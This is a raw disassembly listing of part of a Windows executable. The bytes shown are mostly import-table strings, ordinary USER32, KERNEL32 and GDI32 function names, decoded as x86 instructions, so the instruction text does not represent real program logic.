  42887f:	add    dl,BYTE PTR [edx+0x65]
  428882:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  42888a:	popa   
  42888b:	jae    0x428900
  42888d:	inc    ebp
  42888e:	js     0x4288e7
  428890:	add    BYTE PTR [eax],al
  428892:	and    DWORD PTR [edx],eax
  428894:	push   ebx
  428895:	outs   dx,BYTE PTR gs:[esi]
  428897:	fs inc esp
  428899:	ins    BYTE PTR es:[edi],dx
  42889a:	addr16 dec ecx
  42889c:	je     0x428903
  42889e:	ins    DWORD PTR es:[edi],dx
  42889f:	dec    ebp
  4288a0:	gs jae 0x428916
  4288a3:	popa   
  4288a4:	addr16 gs inc ecx
  4288a7:	add    BYTE PTR ds:0x74654701,bh
  4288ad:	dec    ebp
  4288ae:	gs jae 0x428924
  4288b1:	popa   
  4288b2:	addr16 gs push esp
  4288b5:	imul   ebp,DWORD PTR [ebp+0x65],0x1d0000
  4288bc:	inc    ebx
  4288bd:	popa   
  4288be:	jae    0x428923
  4288c0:	popa   
  4288c1:	fs gs push edi
  4288c4:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  4288cb:	add    bh,bl
  4288cd:	add    BYTE PTR [ebp+0x78],al
  4288d0:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  4288d8:	jae    0x42891f
  4288da:	js     0x4288dc
  4288dc:	repnz add DWORD PTR [eax+0x6f],edx
  4288e0:	jae    0x428956
  4288e2:	dec    ebp
  4288e3:	gs jae 0x428959
  4288e6:	popa   
  4288e7:	addr16 gs push edi
  4288ea:	add    BYTE PTR [eax],al
  4288ec:	add    DWORD PTR fs:[edi+0x65],eax
  4288f0:	je     0x428947
  4288f2:	jo     0x428958
  4288f4:	popa   
  4288f5:	je     0x42895c
  4288f7:	push   edx
  4288f8:	outs   dx,BYTE PTR ds:[si]
  4288fa:	add    BYTE PTR [eax],al
  4288fc:	mov    BYTE PTR [edx],al
  4288fe:	push   esp
  4288ff:	popa   
  428900:	bound  esp,QWORD PTR [edx+0x65]
  428903:	fs push esp
  428905:	gs js  0x42897c
  428908:	dec    edi
  428909:	jne    0x42897f
  42890b:	push   edi
  42890c:	add    BYTE PTR [eax],al
  42890e:	test   eax,0x616f4c01
  428913:	fs inc edx
  428915:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb8004170
  42891d:	add    BYTE PTR [edx+esi*2+0x61],al
  428921:	ja     0x428976
  428923:	je     0x428986
  428925:	je     0x42898c
  428927:	push   edi
  428928:	add    BYTE PTR [eax],al
  42892a:	ja     0x42892d
  42892c:	inc    edi
  42892d:	gs je  0x428987
  428930:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428937:	js     0x4289ad
  428939:	dec    esp
  42893a:	outs   dx,BYTE PTR gs:[esi]
  42893c:	addr16 je 0x4289a7
  42893f:	push   edi
  428940:	add    BYTE PTR [eax],al
  428942:	cmp    BYTE PTR [eax],al
  428944:	inc    ebx
  428945:	push   0x70557261
  42894a:	jo     0x4289b1
  42894c:	jb     0x428990
  42894e:	jne    0x4289b6
  428950:	push   di
  428952:	add    BYTE PTR [eax],al
  428954:	daa    
  428955:	add    DWORD PTR [edi+0x65],eax
  428958:	je     0x4289a5
  42895a:	gs jns 0x4289bf
  42895d:	outs   dx,DWORD PTR ds:[esi]
  42895e:	popa   
  42895f:	jb     0x4289c5
  428961:	push   esp
  428962:	jns    0x4289d4
  428964:	add    BYTE PTR gs:[ebx+0x1],cl
  428968:	inc    edi
  428969:	gs je  0x4289bc
  42896c:	jb     0x4289dd
  42896e:	jo     0x4289c7
  428970:	add    BYTE PTR [eax],al
  428972:	dec    ebp
  428973:	add    BYTE PTR [ebx+0x6f],al
  428976:	jo     0x4289f1
  428978:	push   edx
  428979:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  42897e:	sub    eax,0x61684300
  428983:	jb     0x4289d3
  428985:	gs js  0x4289fc
  428988:	push   edi
  428989:	add    BYTE PTR [eax+0x43734901],dl
  42898f:	push   0x6f4c7261
  428994:	ja     0x4289fb
  428996:	jb     0x4289d9
  428998:	add    BYTE PTR [eax],al
  42899a:	sub    BYTE PTR [ecx],al
  42899c:	inc    edi
  42899d:	gs je  0x4289ec
  4289a0:	popa   
  4289a1:	jae    0x428a17
  4289a3:	inc    ecx
  4289a4:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4289a8:	gs push eax
  4289aa:	outs   dx,DWORD PTR ds:[esi]
  4289ab:	jo     0x428a22
  4289ad:	jo     0x4289af
  4289af:	add    BYTE PTR [ebx+0x616f4c01],bh
  4289b5:	fs push ebx
  4289b7:	je     0x428a2b
  4289b9:	imul   ebp,DWORD PTR [esi+0x67],0x16d0041
  4289c0:	inc    edi
  4289c1:	gs je  0x428a1b
  4289c4:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  4289cb:	outs   dx,BYTE PTR ds:[esi]
  4289cc:	addr16 push edi
  4289ce:	add    BYTE PTR [eax],al
  4289d0:	leave  
  4289d1:	add    DWORD PTR [ebp+0x61],ecx
  4289d4:	jo     0x428a2d
  4289d6:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  4289dd:	imul   ebp,DWORD PTR [esi+0x74],0x350073
  4289e4:	inc    ebx
  4289e5:	push   0x6f547261
  4289ea:	dec    edi
  4289eb:	gs ins DWORD PTR es:[edi],dx
  4289ed:	push   edi
  4289ee:	add    BYTE PTR [eax],al
  4289f0:	push   ebp
  4289f1:	push   ebx
  4289f2:	inc    ebp
  4289f3:	push   edx
  4289f4:	xor    esi,DWORD PTR [edx]
  4289f6:	cs fs ins BYTE PTR es:[edi],dx
  4289f9:	ins    BYTE PTR es:[edi],dx
  4289fa:	add    BYTE PTR [eax],al
  4289fc:	xchg   edx,eax
  4289fd:	add    edx,DWORD PTR [edx+0x74]
  428a00:	ins    BYTE PTR es:[edi],dx
  428a01:	dec    ecx
  428a02:	outs   dx,BYTE PTR ds:[esi]
  428a03:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  428a0b:	jb     0x428a76
  428a0d:	outs   dx,BYTE PTR ds:[esi]
  428a0e:	add    BYTE PTR [bp+0x74],ch
  428a12:	fs ins BYTE PTR es:[edi],dx
  428a14:	ins    BYTE PTR es:[edi],dx
  428a15:	cs fs ins BYTE PTR es:[edi],dx
  428a18:	ins    BYTE PTR es:[edi],dx
  428a19:	add    BYTE PTR ds:0x74654702,al
  428a1f:	dec    esp
  428a20:	outs   dx,DWORD PTR ds:[esi]
  428a21:	arpl   WORD PTR [ecx+0x6c],sp
  428a24:	gs dec ecx
  428a26:	outs   dx,BYTE PTR ds:[esi]
  428a27:	outs   dx,WORD PTR ds:[esi]
  428a29:	push   edi
  428a2a:	add    BYTE PTR [eax],al
  428a2c:	inc    ebp
  428a2d:	add    al,BYTE PTR [edi+0x65]
  428a30:	je     0x428a82
  428a32:	jb     0x428aa3
  428a34:	arpl   WORD PTR [ecx+0x64],ax
  428a37:	fs jb  0x428a9f
  428a3a:	jae    0x428aaf
  428a3c:	add    BYTE PTR [eax],al
  428a3e:	rol    DWORD PTR [eax],cl
  428a40:	inc    ebx
  428a41:	jb     0x428aa8
  428a43:	popa   
  428a44:	je     0x428aab
  428a46:	inc    esi
  428a47:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  428a4f:	outs   dx,BYTE PTR ds:[esi]
  428a50:	addr16 push edi
  428a52:	add    BYTE PTR [eax],al
  428a54:	sub    BYTE PTR [ebx+edx*2],al
  428a57:	gs je  0x428aa2
  428a5a:	popa   
  428a5b:	outs   dx,BYTE PTR ds:[esi]
  428a5c:	fs ins BYTE PTR es:[edi],dx
  428a5e:	gs inc ebx
  428a60:	outs   dx,DWORD PTR ds:[esi]
  428a61:	jne    0x428ad1
  428a63:	je     0x428a65
  428a65:	add    ah,bl
  428a67:	add    BYTE PTR [ebx+0x72],al
  428a6a:	gs popa 
  428a6c:	je     0x428ad3
  428a6e:	dec    ebp
  428a6f:	popa   
  428a70:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  428a78:	pop    DWORD PTR [ecx]
  428a7a:	inc    edi
  428a7b:	gs je  0x428abf
  428a7e:	je     0x428aef
  428a80:	ins    DWORD PTR es:[edi],dx
  428a81:	dec    esi
  428a82:	popa   
  428a83:	ins    DWORD PTR es:[edi],dx
  428a84:	gs inc ecx
  428a86:	add    BYTE PTR [eax],al
  428a88:	pusha  
  428a89:	add    al,BYTE PTR [edi+0x65]
  428a8c:	je     0x428ae1
  428a8e:	jns    0x428b03
  428a90:	je     0x428af7
  428a92:	ins    DWORD PTR es:[edi],dx
  428a93:	push   edi
  428a94:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  428a9b:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  428aa2:	jns    0x428ae5
  428aa4:	add    BYTE PTR [eax],al
  428aa6:	aas    
  428aa7:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  428aab:	fs dec esp
  428aad:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  428ab4:	add    BYTE PTR [eax],al
  428ab6:	xchg   ecx,eax
  428ab7:	add    al,BYTE PTR [edi+0x6c]
  428aba:	outs   dx,DWORD PTR ds:[esi]
  428abb:	bound  esp,QWORD PTR [ecx+0x6c]
  428abe:	inc    ecx
  428abf:	ins    BYTE PTR es:[edi],dx
  428ac0:	ins    BYTE PTR es:[edi],dx
  428ac1:	outs   dx,DWORD PTR ds:[esi]
  428ac2:	arpl   WORD PTR [eax],ax
  428ac4:	xchg   edx,eax
  428ac5:	add    al,0x56
  428ac7:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  428ace:	jne    0x428b35
  428ad0:	jb     0x428b4b
  428ad2:	add    BYTE PTR [eax],al
  428ad4:	test   DWORD PTR [ecx],0x46746547
  428ada:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  428ae2:	jb     0x428ae5
  428ae4:	inc    esi
  428ae5:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  428aec:	jne    0x428b60
  428aee:	arpl   WORD PTR [ebp+0x57],sp
  428af1:	add    BYTE PTR [eax],bh
  428af3:	add    ecx,DWORD PTR [ebp+0x6f]
  428af6:	jbe    0x428b5d
  428af8:	inc    esi
  428af9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52037600
  428b01:	popa   
  428b02:	imul   esi,DWORD PTR [ebx+0x65],0x65637845
  428b09:	jo     0x428b7f
  428b0b:	imul   ebp,DWORD PTR [edi+0x6e],0x1920000
  428b12:	inc    edi
  428b13:	gs je  0x428b58
  428b16:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  428b1d:	jo     0x428b84
  428b1f:	inc    ecx
  428b20:	add    BYTE PTR [eax],al
  428b22:	and    DWORD PTR [ebx+edx*2],eax
  428b25:	gs je  0x428b6e
  428b28:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  428b30:	bound  esi,QWORD PTR [ebp+0x74]
  428b33:	gs jae 0x428b77
  428b36:	add    BYTE PTR [eax],al
  428b38:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  428b3c:	jbe    0x428ba3
  428b3e:	inc    esi
  428b3f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xbf004178
  428b47:	add    BYTE PTR [ebx+0x6f],al
  428b4a:	jo     0x428bc5
  428b4c:	inc    esi
  428b4d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x51037100
  428b55:	jne    0x428bbc
  428b57:	jb     0x428bd2
  428b59:	push   eax
  428b5a:	gs jb  0x428bc3
  428b5d:	outs   dx,DWORD PTR ds:[esi]
  428b5e:	jb     0x428bcd
  428b60:	popa   
  428b61:	outs   dx,BYTE PTR ds:[esi]
  428b62:	arpl   WORD PTR [ebp+0x43],sp
  428b65:	outs   dx,DWORD PTR ds:[esi]
  428b66:	jne    0x428bd6
  428b68:	je     0x428bcf
  428b6a:	jb     0x428b6c
  428b6c:	sub    DWORD PTR [ebx+edx*2],eax
  428b6f:	gs je  0x428bba
  428b72:	popa   
  428b73:	outs   dx,BYTE PTR ds:[esi]
  428b74:	fs ins BYTE PTR es:[edi],dx
  428b76:	gs dec ecx
  428b78:	outs   dx,BYTE PTR ds:[esi]
  428b79:	outs   dx,WORD PTR ds:[esi]
  428b7b:	jb     0x428bea
  428b7d:	popa   
  428b7e:	je     0x428be9
  428b80:	outs   dx,DWORD PTR ds:[esi]
  428b81:	outs   dx,BYTE PTR ds:[esi]
  428b82:	add    BYTE PTR [eax],al
  428b84:	push   ss
  428b85:	add    DWORD PTR [ebp+0x6e],eax
  428b88:	je     0x428bef
  428b8a:	jb     0x428bcf
  428b8c:	jb     0x428bf7
  428b8e:	je     0x428bf9
  428b90:	arpl   WORD PTR [ecx+0x6c],sp
  428b93:	push   ebx
  428b94:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  428b99:	outs   dx,BYTE PTR ds:[esi]
  428b9a:	add    BYTE PTR [eax],al
  428b9c:	jg     0x428b9f
  428b9e:	inc    esi
  428b9f:	outs   dx,DWORD PTR ds:[esi]
  428ba0:	ins    BYTE PTR es:[edi],dx
  428ba1:	fs push ebx
  428ba3:	je     0x428c17
  428ba5:	imul   ebp,DWORD PTR [esi+0x67],0x4dd0057
  428bac:	ins    BYTE PTR es:[edi],dx
  428bad:	jae    0x428c23
  428baf:	jb     0x428c1d
  428bb1:	outs   dx,BYTE PTR gs:[esi]
  428bb3:	inc    ecx
  428bb4:	add    BYTE PTR [eax],al
  428bb6:	sahf   
  428bb7:	add    DWORD PTR [edi+0x65],eax
  428bba:	je     0x428bff
  428bbc:	outs   dx,DWORD PTR ds:[esi]
  428bbd:	ins    DWORD PTR es:[edi],dx
  428bbe:	ins    DWORD PTR es:[edi],dx
  428bbf:	push   esp
  428bc0:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  428bc7:	add    BYTE PTR [edx+eax*1+0x47],dh
  428bcb:	gs je  0x428c22
  428bce:	push   0x64616572
  428bd3:	push   esp
  428bd4:	imul   ebp,DWORD PTR [ebp+0x65],0x4b000073
  428bdb:	inc    ebp
  428bdc:	push   edx
  428bdd:	dec    esi
  428bde:	inc    ebp
  428bdf:	dec    esp
  428be0:	xor    esi,DWORD PTR [edx]
  428be2:	cs fs ins BYTE PTR es:[edi],dx
  428be5:	ins    BYTE PTR es:[edi],dx
  428be6:	add    BYTE PTR [eax],al
  428be8:	mov    dh,0x1
  428bea:	push   eax
  428beb:	outs   dx,DWORD PTR ds:[esi]
  428bec:	ins    BYTE PTR es:[edi],dx
  428bed:	jns    0x428c56
  428bef:	outs   dx,DWORD PTR ds:[esi]
  428bf0:	outs   dx,BYTE PTR ds:[esi]
  428bf1:	add    BYTE PTR [ecx+eax*1+0x47],ch
  428bf5:	gs je  0x428c47
  428bf8:	bound  ebp,QWORD PTR [edx+0x65]
  428bfb:	arpl   WORD PTR [edi+edx*2+0x0],si
  428bff:	add    BYTE PTR [ebx+0x6c654400],dh
  428c05:	gs je  0x428c6d
  428c08:	inc    esp
  428c09:	inc    ebx
  428c0a:	add    BYTE PTR [eax],al
  428c0c:	rol    DWORD PTR [ecx],1
  428c0e:	push   ebx
  428c0f:	gs ins BYTE PTR es:[edi],dx
  428c11:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428c16:	push   0x65
  428c18:	arpl   WORD PTR [eax+eax*1+0x0],si
  428c1c:	jmp    0x428c1f
  428c1e:	push   ebx
  428c1f:	gs je  0x428c6f
  428c22:	popa   
  428c23:	jo     0x428c72
  428c25:	outs   dx,DWORD PTR ds:[esi]
  428c26:	fs add BYTE PTR gs:[eax],al
  428c2a:	leave  
  428c2b:	add    DWORD PTR [edx+0x6f],edx
  428c2e:	jne    0x428c9e
  428c30:	fs push edx
  428c32:	arpl   WORD PTR gs:[eax+eax*1+0x76],si
  428c37:	add    BYTE PTR [edx+0x69],al
  428c3a:	je     0x428c7e
  428c3c:	ins    BYTE PTR es:[edi],dx
  428c3d:	je     0x428c3f
  428c3f:	add    BYTE PTR [ebx+0x61655201],bh
  428c45:	ins    BYTE PTR es:[edi],dx
  428c46:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428c4d:	je     0x428cc3
  428c4f:	add    BYTE PTR gs:[eax],al
  428c52:	jge    0x428c55
  428c54:	inc    edi
  428c55:	gs je  0x428cab
  428c58:	jns    0x428ccd
  428c5a:	je     0x428cc1
  428c5c:	ins    DWORD PTR es:[edi],dx
  428c5d:	push   eax
  428c5e:	popa   
  428c5f:	ins    BYTE PTR es:[edi],dx
  428c60:	gs je  0x428cd7
  428c63:	gs push ebp
  428c65:	jae    0x428ccc
  428c67:	add    BYTE PTR [eax+0x74654701],cl
  428c6d:	push   esp
  428c6e:	gs js  0x428ce5
  428c71:	inc    ebp
  428c72:	js     0x428ce8
  428c74:	outs   dx,BYTE PTR gs:[esi]
  428c76:	je     0x428cc8
  428c78:	outs   dx,DWORD PTR ds:[esi]
  428c79:	imul   ebp,DWORD PTR [esi+0x74],0x1cb0041
  428c80:	push   ebx
  428c81:	arpl   WORD PTR [ecx+0x6c],sp
  428c84:	gs push esi
  428c86:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  428c8d:	inc    ebp
  428c8e:	js     0x428d04
  428c90:	inc    ebp
  428c91:	js     0x428c93
  428c93:	add    bh,cl
  428c95:	add    DWORD PTR [ebx+0x65],edx
  428c98:	ins    BYTE PTR es:[edi],dx
  428c99:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428c9e:	imul   esi,DWORD PTR [eax+0x52],0xfd006e67
  428ca5:	add    DWORD PTR [ebx+0x65],edx
  428ca8:	je     0x428cfe
  428caa:	gs js  0x428d21
  428cad:	inc    ebx
  428cae:	outs   dx,DWORD PTR ds:[esi]
  428caf:	ins    BYTE PTR es:[edi],dx
  428cb0:	outs   dx,DWORD PTR ds:[esi]
  428cb1:	jb     0x428cb3
  428cb3:	add    BYTE PTR [eax+0x74615001],ch
  428cb9:	push   0x65526f54
  428cbe:	imul   ebp,DWORD PTR [bx+0x6e],0x810000
  428cc6:	inc    ebx
  428cc7:	outs   dx,DWORD PTR ds:[esi]
  428cc8:	ins    DWORD PTR es:[edi],dx
  428cc9:	bound  ebp,QWORD PTR [ecx+0x6e]
  428ccc:	gs push edx
  428cce:	outs   dx,BYTE PTR ds:[si]
  428cd0:	add    BYTE PTR [eax],al
  428cd2:	lods   al,BYTE PTR ds:[esi]
  428cd3:	add    BYTE PTR [ebx+0x72],al
  428cd6:	gs popa 
  428cd8:	je     0x428d3f
  428cda:	push   edx
  428cdb:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428ce0:	outs   dx,BYTE PTR ds:[esi]
  428ce1:	dec    ecx
  428ce2:	outs   dx,BYTE PTR ds:[esi]
  428ce3:	imul   esi,DWORD PTR fs:[edx+0x65],0x9a007463
  428ceb:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428cef:	gs push esp
  428cf1:	outs   dx,DWORD PTR ds:[esi]
  428cf2:	add    BYTE PTR [eax],al
  428cf4:	mov    ds:0x65724300,al
  428cf9:	popa   
  428cfa:	je     0x428d61
  428cfc:	dec    ecx
  428cfd:	inc    ebx
  428cfe:	push   edi
  428cff:	add    BYTE PTR [ebp+0x63655201],bh
  428d05:	je     0x428d5d
  428d07:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  428d0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d0f:	add    BYTE PTR [ebx+0x72],al
  428d12:	gs popa 
  428d14:	je     0x428d7b
  428d16:	push   eax
  428d17:	popa   
  428d18:	ins    BYTE PTR es:[edi],dx
  428d19:	gs je  0x428d90
  428d1c:	add    BYTE PTR gs:[edi+0x44],al
  428d20:	dec    ecx
  428d21:	xor    esi,DWORD PTR [edx]
  428d23:	cs fs ins BYTE PTR es:[edi],dx
  428d26:	ins    BYTE PTR es:[edi],dx
	...
  428d2f:	add    BYTE PTR [ebp+0x20],ch
  428d32:	add    al,BYTE PTR [eax]
	...
  428d50:	imul   ecx,DWORD PTR [ebp+0x2],0x0
	...
  428d5f:	add    BYTE PTR [ecx+0x64],ch
  428d62:	js     0x428dcd
  428d64:	outs   dx,DWORD PTR fs:[esi]
  428d66:	arpl   WORD PTR cs:[edi+0x6d],bp
  428d6a:	add    BYTE PTR [ebx+0x65],dl
  428d6d:	je     0x428db0
  428d6f:	outs   dx,BYTE PTR ds:[esi]
  428d70:	arpl   WORD PTR [eax+0x6f],bp
  428d73:	jb     0x428dc4
  428d75:	jb     0x428de0
  428d77:	imul   ebp,DWORD PTR [bp+0x61],0x3231406c
  428d7f:	add    BYTE PTR [eax],al
  428d81:	add    BYTE PTR [eax],al
  428d83:	add    al,bh
  428d85:	test   DWORD PTR [edx],eax
  428d87:	add    BYTE PTR [esi+eax*4],dl
  428d8a:	add    al,BYTE PTR [eax]
  428d8c:	xchg   BYTE PTR es:[edx],al
  428d8f:	add    BYTE PTR [eax],bh
  428d91:	xchg   BYTE PTR [edx],al
  428d93:	add    BYTE PTR [eax-0x7a],dl
  428d96:	add    al,BYTE PTR [eax]
  428d98:	xchg   BYTE PTR fs:[edx],al
  428d9b:	add    BYTE PTR [esi-0x7a],bh
  428d9e:	add    al,BYTE PTR [eax]
  428da0:	add    BYTE PTR [eax],al
  428da2:	add    BYTE PTR [eax],al
  428da4:	mov    al,ds:0xbe000286
  428da9:	xchg   BYTE PTR [edx],al
  428dab:	add    ah,cl
  428dad:	xchg   BYTE PTR [edx],al
  428daf:	add    dl,bl
  428db1:	xchg   BYTE PTR [edx],al
  428db3:	add    dh,ch
  428db5:	xchg   BYTE PTR [edx],al
  428db7:	add    ah,bh
  428db9:	xchg   BYTE PTR [edx],al
  428dbb:	add    BYTE PTR [esi],cl
  428dbd:	xchg   DWORD PTR [edx],eax
  428dbf:	add    BYTE PTR [eax],ah
  428dc1:	xchg   DWORD PTR [edx],eax
  428dc3:	add    BYTE PTR [esi],ch
  428dc5:	xchg   DWORD PTR [edx],eax
  428dc7:	add    BYTE PTR [eax-0x79],al
  428dca:	add    al,BYTE PTR [eax]
  428dcc:	push   edx
  428dcd:	xchg   DWORD PTR [edx],eax
  428dcf:	add    BYTE PTR [eax-0x79],ah
  428dd2:	add    al,BYTE PTR [eax]
  428dd4:	outs   dx,BYTE PTR ds:[esi]
  428dd5:	xchg   DWORD PTR [edx],eax
  428dd7:	add    BYTE PTR [eax-0x73fffd79],al
  428ddd:	xchg   DWORD PTR [edx],eax
  428ddf:	add    BYTE PTR [edx-0x4bfffd79],ah
  428de5:	xchg   DWORD PTR [edx],eax
  428de7:	add    dh,al
  428de9:	xchg   DWORD PTR [edx],eax
  428deb:	add    dl,dl
  428ded:	xchg   DWORD PTR [edx],eax
  428def:	add    dl,ah
  428df1:	xchg   DWORD PTR [edx],eax
  428df3:	add    dl,dh
  428df5:	xchg   DWORD PTR [edx],eax
  428df7:	add    BYTE PTR [eax],cl
  428df9:	mov    BYTE PTR [edx],al
  428dfb:	add    BYTE PTR [eax+ecx*4],dl
  428dfe:	add    al,BYTE PTR [eax]
  428e00:	mov    BYTE PTR es:[edx],al
  428e03:	add    BYTE PTR [eax+ecx*4],bh
  428e06:	add    al,BYTE PTR [eax]
  428e08:	dec    esi
  428e09:	mov    BYTE PTR [edx],al
  428e0b:	add    BYTE PTR [eax+ecx*4+0x2],bl
  428e0f:	add    BYTE PTR [eax+ecx*4+0x2],ch
  428e13:	add    BYTE PTR [esi-0x78],bh
  428e16:	add    al,BYTE PTR [eax]
  428e18:	xchg   edx,eax
  428e19:	mov    BYTE PTR [edx],al
  428e1b:	add    BYTE PTR [eax-0x45fffd78],ch
  428e21:	mov    BYTE PTR [edx],al
  428e23:	add    ah,cl
  428e25:	mov    BYTE PTR [edx],al
  428e27:	add    ah,bl
  428e29:	mov    BYTE PTR [edx],al
  428e2b:	add    ah,ch
  428e2d:	mov    BYTE PTR [edx],al
  428e2f:	add    ah,bh
  428e31:	mov    BYTE PTR [edx],al
  428e33:	add    BYTE PTR [esi],cl
  428e35:	mov    DWORD PTR [edx],eax
  428e37:	add    BYTE PTR [ecx+ecx*4],bl
  428e3a:	add    al,BYTE PTR [eax]
  428e3c:	sub    cl,BYTE PTR [ecx-0x76bdfffe]
  428e42:	add    al,BYTE PTR [eax]
  428e44:	push   esp
  428e45:	mov    DWORD PTR [edx],eax
  428e47:	add    BYTE PTR [esi-0x77],ah
  428e4a:	add    al,BYTE PTR [eax]
  428e4c:	jb     0x428dd7
  428e4e:	add    al,BYTE PTR [eax]
  428e50:	jle    0x428ddb
  428e52:	add    al,BYTE PTR [eax]
  428e54:	mov    cl,BYTE PTR [ecx-0x7665fffe]
  428e5a:	add    al,BYTE PTR [eax]
  428e5c:	mov    al,0x89
  428e5e:	add    al,BYTE PTR [eax]
  428e60:	mov    esi,0xd0000289
  428e65:	mov    DWORD PTR [edx],eax
  428e67:	add    dl,ah
  428e69:	mov    DWORD PTR [edx],eax
  428e6b:	add    BYTE PTR [eax],al
  428e6d:	add    BYTE PTR [eax],al
  428e6f:	add    ah,bh
  428e71:	mov    DWORD PTR [edx],eax
  428e73:	add    BYTE PTR [eax],al
  428e75:	add    BYTE PTR [eax],al
  428e77:	add    BYTE PTR [edx],bl
  428e79:	mov    al,BYTE PTR [edx]
  428e7b:	add    BYTE PTR [edx+ecx*4],ch
  428e7e:	add    al,BYTE PTR [eax]
  428e80:	mov    al,BYTE PTR ds:[edx]
  428e83:	add    BYTE PTR [edx+ecx*4+0x2],dl
  428e87:	add    BYTE PTR [esi-0x76],ah
  428e8a:	add    al,BYTE PTR [eax]
  428e8c:	js     0x428e18
  428e8e:	add    al,BYTE PTR [eax]
  428e90:	mov    BYTE PTR [edx-0x7559fffe],cl
  428e96:	add    al,BYTE PTR [eax]
  428e98:	mov    dh,0x8a
  428e9a:	add    al,BYTE PTR [eax]
  428e9c:	les    ecx,FWORD PTR [edx-0x752bfffe]
  428ea2:	add    al,BYTE PTR [eax]
  428ea4:	loop   0x428e30
  428ea6:	add    al,BYTE PTR [eax]
  428ea8:	repnz mov al,BYTE PTR [edx]
  428eab:	add    dh,bh
  428ead:	mov    al,BYTE PTR [edx]
  428eaf:	add    BYTE PTR [eax],dl
  428eb1:	mov    eax,DWORD PTR [edx]
  428eb3:	add    BYTE PTR [edx],ah
  428eb5:	mov    eax,DWORD PTR [edx]
  428eb7:	add    BYTE PTR [eax],bh
  428eb9:	mov    eax,DWORD PTR [edx]
  428ebb:	add    BYTE PTR [esi-0x75],al
  428ebe:	add    al,BYTE PTR [eax]
  428ec0:	push   edx
  428ec1:	mov    eax,DWORD PTR [edx]
  428ec3:	add    BYTE PTR [ebx+ecx*4+0x2],ch
  428ec7:	add    BYTE PTR [ebx+ecx*4-0x7463fffe],al
  428ece:	add    al,BYTE PTR [eax]
  428ed0:	stos   BYTE PTR es:[edi],al
  428ed1:	mov    eax,DWORD PTR [edx]
  428ed3:	add    BYTE PTR [esi-0x37fffd75],dh
  428ed9:	mov    eax,DWORD PTR [edx]
  428edb:	add    BYTE PTR [eax],al
  428edd:	add    BYTE PTR [eax],al
  428edf:	add    al,ch
  428ee1:	mov    eax,DWORD PTR [edx]
  428ee3:	add    dl,dh
  428ee5:	mov    eax,DWORD PTR [edx]
  428ee7:	add    BYTE PTR [eax],al
  428ee9:	mov    WORD PTR [edx],es
  428eeb:	add    BYTE PTR [esp+ecx*4],cl
  428eee:	add    al,BYTE PTR [eax]
  428ef0:	sbb    al,0x8c
  428ef2:	add    al,BYTE PTR [eax]
  428ef4:	sub    cl,BYTE PTR [edx+eax*1+0x28c3600]
  428efb:	add    BYTE PTR [eax-0x74],al
  428efe:	add    al,BYTE PTR [eax]
  428f00:	push   edx
  428f01:	mov    WORD PTR [edx],es
  428f03:	add    BYTE PTR [eax-0x74],ch
  428f06:	add    al,BYTE PTR [eax]
  428f08:	jle    0x428e96
  428f0a:	add    al,BYTE PTR [eax]
  428f0c:	xchg   esp,eax
  428f0d:	mov    WORD PTR [edx],es
  428f0f:	add    BYTE PTR [esp+ecx*4-0x734bfffe],ah
  428f16:	add    al,BYTE PTR [eax]
  428f18:	les    ecx,FWORD PTR [edx+eax*1+0x28cd200]
  428f1f:	add    dl,ch
  428f21:	mov    WORD PTR [edx],es
  428f23:	add    ah,dh
  428f25:	mov    WORD PTR [edx],es
  428f27:	add    BYTE PTR [eax],al
  428f29:	lea    eax,[edx]
  428f2b:	add    BYTE PTR [esi],cl
  428f2d:	lea    eax,[edx]
  428f2f:	add    BYTE PTR [eax],al
  428f31:	add    BYTE PTR [eax],al
	...
